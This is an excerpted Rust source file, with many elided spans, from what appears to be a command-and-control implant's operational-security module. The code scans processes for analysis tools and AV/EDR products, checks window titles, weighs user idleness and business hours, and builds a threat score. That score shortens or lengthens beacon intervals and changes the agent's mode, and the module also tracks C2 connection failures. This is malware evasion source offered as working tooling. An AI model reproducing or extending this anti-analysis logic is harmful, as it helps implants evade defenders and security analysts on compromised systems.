use crate::high_threat_tools::{
    COMMON_AV_EDR_PROCESSES, HIGH_THREAT_ANALYSIS_TOOLS, SUSPICIOUS_WINDOW_TITLES,
};
...
pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
    ...
    if current_score > 75.0 {
        base_interval = base_interval.min(30);
    } else if current_score > 40.0 {
        base_interval = base_interval.min(60);
    }
    if context.user_idle_level == OpsecLevel::Low {
        base_interval = base_interval.max(300);
    }
    ...
    debug!(
        ...
        adaptive_interval,
        config.proc_scan_interval_secs,
        jitter,
        current_score,
        context.user_idle_level
    );

    context.high_threat_process_detected = check_proc_state(adaptive_interval);

    with_opsec_state_mut(|opsec_state| update_opsec_score_and_mode(opsec_state, &context, config))
}
...
fn update_opsec_score_and_mode(
    ...
    if !opsec_state.dynamic_threshold_initialized {
        ...
        opsec_state.dyn_exit_reduced =
            config.base_score_threshold_bg_to_reduced - HYSTERESIS_BUFFER;
    ...
    let (correlation_multiplier, correlation_bonus) =
        calculate_correlation_bonus(context, opsec_state);
    ...
    if context.is_business_hours {
        ...
        debug!(
            "[OPSEC] Business hours: +{:.1} (×{:.1})",
            weight, correlation_multiplier
        );
    }
    if user_is_active {
    ...
    if correlation_bonus > 0.0 {
        warn!(
            "[OPSEC CORRELATION] Total correlation bonus: +{:.1}",
            correlation_bonus
        );
    }
    ...
    opsec_state.current_score = opsec_state
        .current_score
        .clamp(SCORE_CLAMP_MIN, SCORE_CLAMP_MAX);

    if score_increase > 0.0 {
        debug!(
            "[OPSEC] Score updated: {:.1} -> {:.1} (+{:.1})",
            old_score, opsec_state.current_score, score_increase
        );
    }
...
pub fn check_proc_state(proc_scan_interval: u64) -> bool {
    ...
    for (pid, process) in sys.processes() {
        ...
        for threat in HIGH_THREAT_ANALYSIS_TOOLS.iter() {
            if process_name.contains(&threat.to_lowercase()) {
                warn!(
                    "[OPSEC] HIGH THREAT ANALYSIS TOOL DETECTED: {} (PID: {})",
        ...
        for av_process in COMMON_AV_EDR_PROCESSES.iter() {
            if process_name.contains(&av_process.to_lowercase()) {
                info!(
                    "[OPSEC] AV/EDR process detected: {} (PID: {})",
                    process.name().to_string_lossy(),
                    pid
                );
    ...
    if threat_detected {
        warn!(
            "[OPSEC] THREAT SCAN COMPLETE: {} threat process(es) detected",
            threat_count
        );
    } else {
    ...
    for (pid, process) in sys.processes() {
        ...
        for threat in HIGH_THREAT_ANALYSIS_TOOLS.iter() {
            ...
            if process_name.contains(&linux_threat.to_lowercase()) {
                warn!(
                    "[OPSEC] THREAT ANALYSIS TOOL DETECTED: {} (PID: {})",
                    process.name().to_string_lossy(),
                    pid
                );
                threat_detected = true;
        ...
        for &linux_threat in &linux_threats {
            if process_name.contains(linux_threat) {
                warn!(
                    "[OPSEC] Linux analysis tool detected: {} (PID: {})",
                    process.name().to_string_lossy(),
                    pid
                );
                threat_detected = true;
    ...
    unsafe {
        ...
        if len > 0 {
            ...
            for suspicious_title in SUSPICIOUS_WINDOW_TITLES.iter() {
                if window_title
                    .to_lowercase()
                    .contains(&suspicious_title.to_lowercase())
                {
...
fn adjust_dynamic_thresholds(
    ...
    if context.user_idle_level == OpsecLevel::Low {
        ...
        debug!(
            "[OPSEC DYNAMIC] User idle detected: +{}",
            USER_ACTIVE_MODIFIER
        );
    }
    ...
    if !context.is_business_hours {
        ...
        debug!(
            "[OPSEC DYNAMIC] Off-hours detected: +{}",
    ...
    if context.is_business_hours {
        ...
        debug!(
            "[OPSEC DYNAMIC] Business hours detected: -{}",
            BUSINESS_HOURS_MODIFIER
        );
    }
    ...
    if context.user_idle_level == OpsecLevel::High {
        ...
        debug!(
            "[OPSEC DYNAMIC] User active detected: -{}",
            USER_ACTIVE_MODIFIER
        );
    }
    ...
    if opsec_state.consecutive_c2_failures > 0 {
        ...
        debug!(
            "[OPSEC DYNAMIC] C2 failures detected: -{}",
            THRESHOLD_ADJUSTMENT_UNSTABLE.abs()
        );
    }
    ...
    opsec_state.dyn_exit_full = opsec_state
        .dyn_exit_full
        .min(opsec_state.dyn_enter_full - HYSTERESIS_BUFFER);
    opsec_state.dyn_exit_reduced = opsec_state
        .dyn_exit_reduced
        .min(opsec_state.dyn_enter_reduced - HYSTERESIS_BUFFER);
    ...
    opsec_state.threshold_adjustment_history =
        opsec_state.threshold_adjustment_history.saturating_add(1);
...
fn calculate_correlation_bonus(context: &OpsecContext, opsec_state: &OpsecState) -> (f32, f32) {
    ...
    if context.high_threat_process_detected && context.user_idle_level == OpsecLevel::High {
        ...
        warn!(
            "[OPSEC CORRELATION] CRITICAL: Analysis tool + active user! (+{})",
            ANALYST_WORKING_BONUS
        );
    }
    ...
    if context.high_threat_process_detected && context.suspicious_window_detected {
        ...
        warn!(
            "[OPSEC CORRELATION] Multiple analysis threats detected! (+{})",
            MULTIPLE_THREATS_BONUS
        );
    }
    ...
    if active_count >= 4 {
        ...
        warn!(
            "[OPSEC CORRELATION] CRITICAL: {} signals active! (+{})",
            active_count, CRITICAL_CORRELATION_BONUS
        );
    } else if active_count >= 3 {
        correlation_bonus += HIGH_CORRELATION_BONUS;
        warn!(
            "[OPSEC CORRELATION] High correlation: {} signals (+{})",
            active_count, HIGH_CORRELATION_BONUS
        );
    }

    // Return multiplier and bonus
    let multiplier = if active_count >= 2 {
...
pub fn record_c2_failure() {
    with_opsec_state_mut(|state| {
        ...
        warn!(
            "[OPSEC] C2 failure recorded: {} consecutive failures",
...
pub fn record_c2_success() {
    with_opsec_state_mut(|state| {
        if state.consecutive_c2_failures > 0 {
            info!(
                "[OPSEC] C2 connection restored after {} failures",
                state.consecutive_c2_failures
            );
